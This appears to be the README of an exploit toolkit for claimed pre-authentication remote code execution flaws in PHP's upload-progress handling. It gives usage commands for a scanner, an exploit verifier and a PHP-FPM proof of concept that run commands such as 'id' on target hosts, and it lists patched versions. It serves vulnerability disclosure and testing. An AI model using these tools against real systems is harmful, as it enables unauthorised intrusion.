# PHP2Shell

**CVE-2026-109618 & CVE-2026-109619 — Pre-Auth RCE in PHP Core**

Two critical vulnerabilities in PHP's `session.upload_progress` handler enable pre-authentication remote code execution on default PHP installations (5.4.0 – 8.5.11).

## Tools

### php2shell_check.py — Scanner (safe, non-destructive)

```bash
python php2shell_check.py example.com
python php2shell_check.py example.com --recon
python php2shell_check.py -f targets.txt -o results.json
```

### php2shell_verify.py — Exploit Verifier (lab only)

```bash
python php2shell_verify.py scan http://target:8888
python php2shell_verify.py verify http://target:8888
python php2shell_verify.py exploit http://target:8888 --command "id"
```

### chain_e_fpm_wfh.py — Chain E PoC (PHP-FPM)

```bash
python chain_e_fpm_wfh.py --stage leak
python chain_e_fpm_wfh.py --stage full --cmd "id"
```

## Mitigation

Upgrade to PHP **8.2.35 / 8.3.36 / 8.4.27 / 8.5.12+**.

## Disclaimer

For authorized security research and educational purposes only.
